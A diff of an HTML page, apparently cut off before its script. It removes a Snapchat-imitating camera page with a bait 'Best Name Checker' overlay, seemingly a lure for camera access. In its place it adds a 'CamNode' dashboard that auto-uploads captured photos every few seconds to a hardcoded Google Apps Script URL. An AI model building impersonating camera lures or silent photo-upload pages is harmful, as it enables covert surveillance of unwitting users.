@@ -2,1011 +2,919 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Snapchat</title>
-    
-    <!-- Load face-api.js for AR Filters -->
-    <script defer src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Node &amp; Automated Drive Sync | CamNode</title>
+    <meta name="description" content="Capture photos securely from any device and sync directly to Google Drive with automated node functionality.">
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%232563eb' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><rect x='2' y='3' width='20' height='14' rx='2'/><circle cx='12' cy='10' r='3'/><path d='M7 21h10'/></svg>">
     <style>
-        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body, html {
-            margin: 0; padding: 0; width: 100%; height: 100%;
-            background-color: #000; color: #fff;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            overflow: hidden;
-        }
-
-        #video-container {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 1; border-radius: 20px; overflow: hidden;
-        }
-        
-        #video-container video, #video-container canvas {
-            position: absolute; top: 0; left: 0;
-            width: 100%; height: 100%; object-fit: cover;
-        }
-        
-        #video-container video { transition: filter 0.3s ease; }
-        #ar-canvas { z-index: 2; pointer-events: none; }
-        #freeze-canvas { z-index: 1; display: none; }
-
-        /* Snapchat UI Layer */
-        .ui-layer {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 10; display: flex; flex-direction: column; justify-content: space-between;
-            pointer-events: none; /* Let clicks pass through empty space */
-        }
-        
-        .ui-layer > * { pointer-events: auto; }
-
-        /* Top Bar */
-        .top-bar {
-            display: flex; justify-content: space-between; align-items: center;
-            padding: 40px 20px 10px 20px; width: 100%;
-        }
-        .top-icon {
-            width: 40px; height: 40px; border-radius: 50%;
-            background: rgba(0,0,0,0.3); backdrop-filter: blur(5px);
-            display: flex; justify-content: center; align-items: center;
-            font-size: 1.2rem;
-        }
-        .search-bar {
-            flex-grow: 1; margin: 0 15px; height: 40px; border-radius: 20px;
-            background: rgba(0,0,0,0.3); backdrop-filter: blur(5px);
-            display: flex; align-items: center; padding: 0 15px; color: rgba(255,255,255,0.7);
-            font-size: 0.9rem;
-        }
-
-        /* Side Bar (Right) */
-        .side-bar {
-            position: absolute; right: 20px; top: 100px;
-            display: flex; flex-direction: column; gap: 15px;
-        }
-        .side-icon {
-            width: 40px; height: 40px; border-radius: 50%;
-            background: rgba(0,0,0,0.3); backdrop-filter: blur(5px);
-            display: flex; justify-content: center; align-items: center;
-            font-size: 1.2rem; cursor: pointer;
-        }
-
-        /* Bottom UI */
-        .bottom-ui {
-            width: 100%; padding-bottom: 40px;
-            display: flex; flex-direction: column; align-items: center;
-        }
-
-        /* Filter Carousel */
-        .filter-carousel {
-            display: flex; gap: 15px; overflow-x: auto;
-            width: 100%; padding: 20px; box-sizing: border-box;
-            -ms-overflow-style: none; scrollbar-width: none;
-            justify-content: center; margin-bottom: 20px;
-        }
-        .filter-carousel::-webkit-scrollbar { display: none; }
-        
-        .filter-btn {
-            min-width: 65px; height: 65px; border-radius: 50%;
-            border: 3px solid rgba(255,255,255,0.8); background: rgba(0,0,0,0.2);
-            display: flex; justify-content: center; align-items: center;
-            font-size: 1.5rem; cursor: pointer; transition: transform 0.2s;
-            backdrop-filter: blur(4px); flex-shrink: 0;
-        }
-        .filter-btn.active {
-            border-color: #fffc00; transform: scale(1.1);
-        }
-
-        /* Main Capture Button */
-        .capture-area {
-            display: flex; justify-content: space-between; align-items: center;
-            width: 100%; padding: 0 40px;
-        }
-        .capture-ring {
-            width: 90px; height: 90px; border-radius: 50%;
-            border: 5px solid #fff; display: flex; justify-content: center; align-items: center;
-            cursor: pointer;
-        }
-        .capture-btn-inner {
-            width: 76px; height: 76px; border-radius: 50%;
-            background: rgba(255,255,255,0.4); transition: all 0.1s;
-        }
-        .capture-ring:active .capture-btn-inner {
-            background: #fff; transform: scale(0.9);
-        }
-        
-        .bottom-icon {
-            width: 35px; height: 35px; font-size: 1.5rem; opacity: 0.8;
-        }
-
-        /* Name Analyzer & Welcome Screen */
-        .hidden-controls {
-            position: absolute; z-index: 20; top: 0; left: 0; width: 100%; height: 100%;
-            display: flex; flex-direction: column; justify-content: center; align-items: center;
-            background: radial-gradient(circle at 50% 20%, #201a35 0%, #0c0d14 100%);
-            padding: 20px;
-            overflow-y: auto;
+        * {
             box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-tap-highlight-color: transparent;
         }
-
-        .analyzer-card {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            border-radius: 28px;
-            padding: 28px 22px;
+        html, body {
             width: 100%;
-            max-width: 420px;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), 0 0 30px rgba(255, 252, 0, 0.15);
-            text-align: center;
-            animation: fadeInCard 0.5s ease-out;
-            position: relative;
-            box-sizing: border-box;
+            min-height: 100%;
+            overflow-x: hidden;
+            background-color: #0d1117;
+            color: #e6edf3;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+        }
+        a {
+            color: #58a6ff;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
         }
 
-        @keyframes fadeInCard {
-            from { opacity: 0; transform: translateY(20px) scale(0.97); }
-            to { opacity: 1; transform: translateY(0) scale(1); }
+        /* Toast Notifications */
+        .toast-container {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            max-width: 90vw;
+            pointer-events: none;
         }
-
-        .analyzer-badge {
-            display: inline-flex;
+        .toast {
+            pointer-events: auto;
+            min-width: 280px;
+            max-width: 380px;
+            background-color: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 12px 16px;
+            display: flex;
             align-items: center;
-            gap: 6px;
-            background: rgba(255, 252, 0, 0.15);
-            border: 1px solid rgba(255, 252, 0, 0.4);
-            color: #fffc00;
-            padding: 6px 16px;
-            border-radius: 20px;
-            font-size: 0.82rem;
-            font-weight: 700;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-            margin-bottom: 12px;
-        }
-
-        .analyzer-title {
-            font-size: 1.75rem;
-            font-weight: 800;
-            margin: 0 0 8px 0;
-            background: linear-gradient(135deg, #ffffff 40%, #fffc00 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .analyzer-subtitle {
-            font-size: 0.92rem;
-            color: rgba(255, 255, 255, 0.7);
-            margin: 0 0 24px 0;
+            gap: 12px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
+            animation: slideIn 0.2s ease-out;
+            font-size: 0.9rem;
             line-height: 1.4;
         }
-
-        .input-group {
-            margin-bottom: 20px;
-            position: relative;
-            text-align: left;
+        .toast.success {
+            border-left: 4px solid #238636;
+        }
+        .toast.error {
+            border-left: 4px solid #da3633;
+        }
+        .toast.info {
+            border-left: 4px solid #2f81f7;
+        }
+        .toast-icon {
+            width: 20px;
+            height: 20px;
+            flex-shrink: 0;
+        }
+        .toast.success .toast-icon { stroke: #238636; }
+        .toast.error .toast-icon { stroke: #da3633; }
+        .toast.info .toast-icon { stroke: #2f81f7; }
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
         }
 
-        .input-label {
-            display: block;
-            font-size: 0.8rem;
-            font-weight: 600;
-            color: rgba(255, 255, 255, 0.85);
-            margin-bottom: 8px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .name-input {
+        /* Navigation Header */
+        .header {
             width: 100%;
-            padding: 15px 18px;
-            font-size: 1.05rem;
-            color: #fff;
-            background: rgba(0, 0, 0, 0.45);
-            border: 2px solid rgba(255, 255, 255, 0.18);
-            border-radius: 18px;
-            outline: none;
-            transition: all 0.25s ease;
-            box-sizing: border-box;
-        }
-
-        .name-input:focus {
-            border-color: #fffc00;
-            box-shadow: 0 0 15px rgba(255, 252, 0, 0.3);
-            background: rgba(0, 0, 0, 0.65);
-        }
-
-        .name-input::placeholder {
-            color: rgba(255, 255, 255, 0.4);
-        }
-
-        .btn-analyze {
-            width: 100%;
-            background: linear-gradient(135deg, #fffc00 0%, #ffbb00 100%);
-            color: #000;
-            border: none;
-            padding: 16px 20px;
-            border-radius: 20px;
-            font-size: 1.1rem;
-            font-weight: 800;
-            cursor: pointer;
-            box-shadow: 0 6px 20px rgba(255, 252, 0, 0.35);
-            transition: all 0.2s ease;
+            background-color: #161b22;
+            border-bottom: 1px solid #30363d;
+            padding: 14px 20px;
             display: flex;
-            justify-content: center;
             align-items: center;
-            gap: 8px;
+            justify-content: space-between;
+            position: relative;
+            z-index: 50;
         }
-
-        .btn-analyze:active {
-            transform: scale(0.97);
-            box-shadow: 0 3px 10px rgba(255, 252, 0, 0.25);
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 700;
+            font-size: 1.15rem;
+            color: #f0f6fc;
+            text-decoration: none;
         }
-
-        /* Loading / Scanning state */
-        .analyzer-loading {
+        .brand:hover {
+            text-decoration: none;
+            opacity: 0.9;
+        }
+        .brand svg {
+            width: 24px;
+            height: 24px;
+            stroke: #2f81f7;
+        }
+        .nav-links {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        .nav-link {
+            font-size: 0.92rem;
+            color: #8b949e;
+            padding: 8px 12px;
+            border-radius: 6px;
+            transition: color 0.15s ease;
+        }
+        .nav-link:hover, .nav-link.active {
+            color: #f0f6fc;
+            text-decoration: none;
+        }
+        .menu-toggle {
             display: none;
-            margin: 25px 0;
-            text-align: center;
+            background: #21262d;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 8px 12px;
+            color: #c9d1d9;
+            cursor: pointer;
+            min-height: 44px;
+            min-width: 44px;
         }
-
-        .scan-spinner {
-            width: 55px;
-            height: 55px;
-            margin: 0 auto 15px auto;
-            border: 4px solid rgba(255, 252, 0, 0.2);
-            border-top: 4px solid #fffc00;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .scan-status-text {
-            font-size: 0.95rem;
-            color: #fffc00;
-            font-weight: 600;
-            letter-spacing: 0.3px;
-        }
-
-        /* Result View */
-        .result-container {
+        .mobile-menu {
             display: none;
-            text-align: center;
-            animation: fadeInCard 0.4s ease-out;
+            position: absolute;
+            top: 100%;
+            left: 0;
+            width: 100%;
+            background-color: #161b22;
+            border-bottom: 1px solid #30363d;
+            padding: 16px 20px;
+            flex-direction: column;
+            gap: 10px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
+        }
+        .mobile-menu.open {
+            display: flex;
         }
 
-        .verdict-banner {
-            background: linear-gradient(135deg, #00b09b 0%, #96c93d 100%);
-            color: #000;
-            padding: 8px 16px;
-            border-radius: 14px;
-            font-size: 0.88rem;
-            font-weight: 900;
-            letter-spacing: 0.5px;
-            margin-bottom: 12px;
-            display: inline-block;
-            box-shadow: 0 4px 15px rgba(0, 176, 155, 0.4);
+        /* Main Content Container */
+        .main {
+            flex: 1;
+            max-width: 980px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 24px 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
         }
 
-        .result-name {
-            font-size: 1.9rem;
-            font-weight: 900;
-            color: #fffc00;
-            margin-bottom: 12px;
-            text-shadow: 0 0 20px rgba(255, 252, 0, 0.5);
-            word-break: break-word;
+        /* Camera Dashboard Layout */
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: 1fr 340px;
+            gap: 20px;
+        }
+        @media (max-width: 840px) {
+            .dashboard-grid {
+                grid-template-columns: 1fr;
+            }
         }
 
-        .score-circle-bar {
-            background: rgba(255, 255, 255, 0.08);
-            border-radius: 16px;
+        /* Viewport Container */
+        .viewport-card {
+            background-color: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 8px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        .viewport-header {
             padding: 12px 16px;
-            margin-bottom: 16px;
+            background-color: #1c2128;
+            border-bottom: 1px solid #30363d;
             display: flex;
             align-items: center;
             justify-content: space-between;
         }
-
-        .score-value {
-            font-size: 1.6rem;
-            font-weight: 900;
-            color: #fffc00;
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.85rem;
+            color: #8b949e;
+        }
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background-color: #8b949e;
+        }
+        .status-dot.active {
+            background-color: #238636;
+        }
+        .video-box {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 4 / 3;
+            background-color: #010409;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none;
+        }
+        video.active {
+            display: block;
+        }
+        .video-placeholder {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+            color: #8b949e;
+            padding: 20px;
+            text-align: center;
+        }
+        .video-placeholder svg {
+            width: 48px;
+            height: 48px;
+            stroke: #484f58;
+        }
+        #flashOverlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #ffffff;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.1s ease;
         }
 
-        .score-label {
-            font-size: 0.82rem;
-            color: rgba(255, 255, 255, 0.85);
-            text-align: left;
-        }
-
-        .metrics-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
+        /* Control Panel */
+        .control-bar {
+            padding: 16px;
+            background-color: #161b22;
+            border-top: 1px solid #30363d;
+            display: flex;
+            flex-wrap: wrap;
             gap: 10px;
-            margin-bottom: 16px;
         }
-
-        .metric-card {
-            background: rgba(255, 255, 255, 0.06);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 10px;
-            border-radius: 14px;
-            text-align: left;
-        }
-
-        .metric-title {
-            font-size: 0.72rem;
-            color: rgba(255, 255, 255, 0.65);
-            text-transform: uppercase;
-        }
-
-        .metric-val {
-            font-size: 1rem;
-            font-weight: 800;
-            color: #fff;
-            margin-top: 3px;
-        }
-
-        .personality-box {
-            background: rgba(255, 252, 0, 0.08);
-            border: 1px solid rgba(255, 252, 0, 0.25);
-            border-radius: 16px;
-            padding: 13px;
-            font-size: 0.86rem;
-            color: #fff;
-            line-height: 1.45;
-            margin-bottom: 18px;
-            text-align: left;
-        }
-
-        .btn-launch-cam {
-            width: 100%;
-            background: #fffc00;
-            color: #000;
-            border: none;
-            padding: 15px 20px;
-            border-radius: 20px;
-            font-size: 1.05rem;
-            font-weight: 800;
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 0.92rem;
+            font-weight: 600;
+            padding: 10px 16px;
+            border-radius: 6px;
+            border: 1px solid transparent;
             cursor: pointer;
-            box-shadow: 0 6px 20px rgba(255, 252, 0, 0.4);
-            margin-bottom: 10px;
-            transition: all 0.2s ease;
+            transition: all 0.15s ease;
+            min-height: 44px;
         }
-
-        .btn-launch-cam:active {
-            transform: scale(0.97);
+        .btn svg {
+            width: 18px;
+            height: 18px;
         }
-
+        .btn-primary {
+            background-color: #238636;
+            color: #ffffff;
+            border-color: rgba(240, 246, 252, 0.1);
+        }
+        .btn-primary:hover {
+            background-color: #2ea043;
+        }
+        .btn-primary:disabled {
+            background-color: #1f3725;
+            color: #6e7681;
+            cursor: not-allowed;
+        }
         .btn-secondary {
-            background: transparent;
-            color: rgba(255, 255, 255, 0.8);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            padding: 11px 18px;
-            border-radius: 16px;
-            font-size: 0.88rem;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            width: 100%;
+            background-color: #21262d;
+            color: #c9d1d9;
+            border-color: #30363d;
         }
-
         .btn-secondary:hover {
-            background: rgba(255, 255, 255, 0.1);
-            color: #fff;
+            background-color: #30363d;
+            color: #f0f6fc;
+        }
+        .btn-secondary:disabled {
+            background-color: #161b22;
+            color: #484f58;
+            cursor: not-allowed;
+        }
+        .btn-danger {
+            background-color: #21262d;
+            color: #f85149;
+            border-color: #30363d;
+        }
+        .btn-danger:hover {
+            background-color: #b62324;
+            color: #ffffff;
         }
 
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            20%, 60% { transform: translateX(-8px); }
-            40%, 80% { transform: translateX(8px); }
+        /* Sidebar Settings & Stats */
+        .sidebar {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
         }
-        .shake {
-            animation: shake 0.4s ease-in-out;
-            border-color: #ff4757 !important;
+        .card {
+            background-color: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 8px;
+            padding: 18px;
         }
-        
-        #flash {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: white; z-index: 15; opacity: 0; pointer-events: none;
-            transition: opacity 0.1s;
+        .card-title {
+            font-size: 1rem;
+            font-weight: 700;
+            color: #f0f6fc;
+            margin-bottom: 14px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #30363d;
         }
-        
-        .ar-loading {
-            position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%);
-            background: rgba(0,0,0,0.7); color: #fff; padding: 15px 25px;
-            border-radius: 30px; font-size: 1rem; font-weight: bold;
-            z-index: 15; display: none; text-align: center;
+        .form-group {
+            margin-bottom: 14px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 0.84rem;
+            font-weight: 600;
+            color: #8b949e;
+            margin-bottom: 6px;
+        }
+        .input-text {
+            width: 100%;
+            background-color: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 10px 12px;
+            color: #f0f6fc;
+            font-size: 0.9rem;
+            box-sizing: border-box;
+            outline: none;
+        }
+        .input-text:focus {
+            border-color: #58a6ff;
+            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.2);
+        }
+        .stat-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 0;
+            font-size: 0.88rem;
+            border-bottom: 1px solid #21262d;
+        }
+        .stat-row:last-child {
+            border-bottom: none;
+        }
+        .stat-label {
+            color: #8b949e;
+        }
+        .stat-value {
+            font-weight: 600;
+            color: #f0f6fc;
+            font-family: monospace;
+        }
+
+        /* Footer */
+        .footer {
+            background-color: #161b22;
+            border-top: 1px solid #30363d;
+            padding: 24px 20px;
+            font-size: 0.88rem;
+            color: #8b949e;
+            margin-top: auto;
+        }
+        .footer-inner {
+            max-width: 980px;
+            margin: 0 auto;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            gap: 16px;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 16px;
+        }
+        .footer-contact {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 16px;
+        }
+
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+            }
+            .menu-toggle {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+            .control-bar {
+                flex-direction: column;
+            }
+            .btn {
+                width: 100%;
+            }
+            .footer-inner {
+                flex-direction: column;
+                align-items: flex-start;
+            }
         }
     </style>
 </head>
 <body>
 
-    <div id="video-container">
-        <video id="video" autoplay playsinline muted></video>
-        <canvas id="freeze-canvas"></canvas>
-        <canvas id="ar-canvas"></canvas>
-    </div>
+    <!-- Toast Notifications Area -->
+    <div class="toast-container" id="toastContainer" aria-live="polite"></div>
 
-    <div id="flash"></div>
-    <div id="ar-loading" class="ar-loading">Loading Lens...</div>
+    <!-- Navigation Header -->
+    <header class="header">
+        <a href="index.html" class="brand" aria-label="CamNode Home">
+            <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="2" y="3" width="20" height="14" rx="2"></rect>
+                <circle cx="12" cy="10" r="3"></circle>
+                <path d="M7 21h10"></path>
+            </svg>
+            <span>CamNode</span>
+        </a>
+        <nav class="nav-links">
+            <a href="index.html" class="nav-link active">Camera App</a>
+            <a href="privacy.html" class="nav-link">Privacy Policy</a>
+            <a href="terms.html" class="nav-link">Terms</a>
+            <a href="404.html" class="nav-link">Status</a>
+        </nav>
+        <button class="menu-toggle" id="menuToggle" aria-label="Toggle navigation menu">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <line x1="3" y1="12" x2="21" y2="12"></line>
+                <line x1="3" y1="6" x2="21" y2="6"></line>
+                <line x1="3" y1="18" x2="21" y2="18"></line>
+            </svg>
+        </button>
+        <nav class="mobile-menu" id="mobileMenu">
+            <a href="index.html" class="nav-link active">Camera App</a>
+            <a href="privacy.html" class="nav-link">Privacy Policy</a>
+            <a href="terms.html" class="nav-link">Terms and Conditions</a>
+            <a href="tel:+15550192834" class="nav-link">Support: +1 (555) 019-2834</a>
+            <a href="mailto:support@camnode.local" class="nav-link">Email: support@camnode.local</a>
+        </nav>
+    </header>
 
-    <!-- UI Overlay matching Snapchat -->
-    <div class="ui-layer" id="ui-overlay" style="display: none;">
-        
-        <div class="top-bar">
-            <div class="top-icon">👤</div>
-            <div class="search-bar" id="top-name-badge" style="cursor: pointer;" title="Tap to analyze another name">✨ <span id="display-user-name">Guest</span> (Name Analyzer)</div>
-            <div class="top-icon">👤+</div>
-        </div>
-
-        <div class="side-bar">
-            <div class="side-icon" id="btn-switch">🔄</div>
-            <div class="side-icon">⚡</div>
-            <div class="side-icon">🎵</div>
-            <div class="side-icon">▶️</div>
-        </div>
-
-        <div class="bottom-ui">
-            <div class="filter-carousel" id="filters">
-                <div class="filter-btn active" data-filter="none">🚫</div>
-                <div class="filter-btn" data-filter="ar-dog">🐶</div>
-                <div class="filter-btn" data-filter="ar-crown">👑</div>
-                <div class="filter-btn" data-filter="ar-glasses">🕶️</div>
-                <div class="filter-btn" data-filter="grayscale(100%)">B&W</div>
-                <div class="filter-btn" data-filter="sepia(0.5) hue-rotate(-30deg) contrast(1.2)">Vtg</div>
-            </div>
+    <!-- Main Content -->
+    <main class="main">
+        <div class="dashboard-grid">
             
-            <div class="capture-area">
-                <div class="bottom-icon">🖼️</div>
-                <div class="capture-ring" id="btn-capture">
-                    <div class="capture-btn-inner"></div>
+            <!-- Left: Viewport and Camera Actions -->
+            <section class="viewport-card" aria-label="Camera Live Viewport">
+                <div class="viewport-header">
+                    <div class="status-indicator">
+                        <span class="status-dot" id="cameraStatusDot"></span>
+                        <span id="cameraStatusText">Camera Offline</span>
+                    </div>
+                    <span id="cameraResolution" style="font-size: 0.8rem; color: #8b949e; font-family: monospace;"></span>
                 </div>
-                <div class="bottom-icon">😊</div>
+
+                <div class="video-box">
+                    <video id="videoFeed" autoplay playsinline muted></video>
+                    <div class="video-placeholder" id="videoPlaceholder">
+                        <svg viewBox="0 0 24 24" fill="none" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path>
+                            <circle cx="12" cy="13" r="4"></circle>
+                        </svg>
+                        <p>Camera feed is stopped. Click Start Camera to begin.</p>
+                    </div>
+                    <div id="flashOverlay"></div>
+                </div>
+
+                <div class="control-bar">
+                    <button class="btn btn-primary" id="btnToggleCamera">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <polygon points="5 3 19 12 5 21 5 3"></polygon>
+                        </svg>
+                        <span id="btnToggleCameraText">Start Camera</span>
+                    </button>
+
+                    <button class="btn btn-secondary" id="btnSwitchCamera" disabled>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <polyline points="23 4 23 10 17 10"></polyline>
+                            <polyline points="1 20 1 14 7 14"></polyline>
+                            <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"></path>
+                        </svg>
+                        <span>Switch Camera</span>
+                    </button>
+
+                    <button class="btn btn-secondary" id="btnManualCapture" disabled>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path>
+                            <circle cx="12" cy="13" r="4"></circle>
+                        </svg>
+                        <span>Capture Photo</span>
+                    </button>
+
+                    <button class="btn btn-secondary" id="btnToggleSync" disabled>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M21.5 2v6h-6M21.34 15.57a10 10 0 1 1-.57-8.38l5.67-5.67"></path>
+                        </svg>
+                        <span id="btnToggleSyncText">Enable Auto Sync</span>
+                    </button>
+                </div>
+            </section>
+
+            <!-- Right: Settings and Node Telemetry -->
+            <aside class="sidebar">
+                
+                <!-- Node Settings -->
+                <div class="card">
+                    <h2 class="card-title">Node Configuration</h2>
+                    <div class="form-group">
+                        <label for="nodeIdentifier">Node Identifier</label>
+                        <input type="text" id="nodeIdentifier" class="input-text" value="Camera-Node-01" maxlength="32">
+                    </div>
+                    <div class="form-group">
+                        <label for="backendUrl">Google Apps Script Web App URL</label>
+                        <input type="url" id="backendUrl" class="input-text" value="https://script.google.com/macros/s/AKfycbxGwHJVE-sk3MQOcdcbuCEg9GIjf4bT47Lv-UC29Ptd0qYuLFM6_uLmn7lsNmkjdWki/exec">
+                    </div>
+                    <div class="form-group">
+                        <label for="syncIntervalSelect">Auto Sync Interval</label>
+                        <select id="syncIntervalSelect" class="input-text">
+                            <option value="5000">5 seconds</option>
+                            <option value="10000">10 seconds</option>
+                            <option value="30000">30 seconds</option>
+                            <option value="60000">60 seconds</option>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- Node Telemetry -->
+                <div class="card">
+                    <h2 class="card-title">Live Telemetry</h2>
+                    <div class="stat-row">
+                        <span class="stat-label">Active Camera:</span>
+                        <span class="stat-value" id="statFacing">None</span>
+                    </div>
+                    <div class="stat-row">
+                        <span class="stat-label">Captured Frames:</span>
+                        <span class="stat-value" id="statCaptures">0</span>
+                    </div>
+                    <div class="stat-row">
+                        <span class="stat-label">Uploaded to Drive:</span>
+                        <span class="stat-value" id="statUploads">0</span>
+                    </div>
+                    <div class="stat-row">
+                        <span class="stat-label">Last Transmission:</span>
+                        <span class="stat-value" id="statLastTransmission">Never</span>
+                    </div>
+                </div>
+
+            </aside>
+
+        </div>
+    </main>
+
+    <!-- Canvas elements for capture -->
+    <canvas id="captureCanvas" style="display: none;"></canvas>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-inner">
+            <div>
+                &copy; <span id="year">2026</span> CamNode. All rights reserved.
+            </div>
+            <div class="footer-links">
+                <a href="index.html">Camera App</a>
+                <a href="privacy.html">Privacy Policy</a>
+                <a href="terms.html">Terms and Conditions</a>
+            </div>
+            <div class="footer-contact">
+                <a href="tel:+15550192834">+1 (555) 019-2834</a>
+                <a href="mailto:support@camnode.local">support@camnode.local</a>
             </div>
         </div>
-
-    </div>
-
-    <div class="hidden-controls" id="controls">
-        <div class="analyzer-card" id="analyzer-card">
-            
-            <!-- State 1: Input Form -->
-            <div id="form-container">
-                <div class="analyzer-badge">✨ AI Vibe & Name Scanner ✨</div>
-                <h1 class="analyzer-title">Best Name Checker</h1>
-                <p class="analyzer-subtitle">Enter your name to analyze its cosmic aura, personality, and see if it ranks as the <b>BEST NAME</b>! 👑</p>
-                
-                <div class="input-group">
-                    <label class="input-label" for="user-name-input">Enter Your Name</label>
-                    <input type="text" id="user-name-input" class="name-input" placeholder="e.g. Manish, Priya, Rahul..." maxlength="30" autocomplete="name" />
-                </div>
-
-                <button class="btn-analyze" id="btn-analyze">
-                    <span>🔮 Analyze My Name</span>
-                </button>
-            </div>
-
-            <!-- State 2: Loading Animation -->
-            <div class="analyzer-loading" id="loading-container">
-                <div class="scan-spinner"></div>
-                <div class="scan-status-text" id="scan-status">Decoding name phonetics...</div>
-            </div>
-
-            <!-- State 3: Analysis Result -->
-            <div class="result-container" id="result-container">
-                <div class="verdict-banner" id="verdict-banner">🏆 100% BEST NAME CONFIRMED!</div>
-                <div class="result-name" id="result-name">Manish</div>
-                
-                <div class="score-circle-bar">
-                    <div class="score-label">
-                        <strong>Best Name Index</strong><br>
-                        <span style="font-size: 0.75rem; opacity: 0.7;">Calculated from name harmonics & numerology</span>
-                    </div>
-                    <div class="score-value" id="result-score">99%</div>
-                </div>
-
-                <div class="metrics-grid">
-                    <div class="metric-card">
-                        <div class="metric-title">⚡ Charisma</div>
-                        <div class="metric-val" id="metric-charm">98%</div>
-                    </div>
-                    <div class="metric-card">
-                        <div class="metric-title">👑 Leadership</div>
-                        <div class="metric-val" id="metric-lead">99%</div>
-                    </div>
-                    <div class="metric-card">
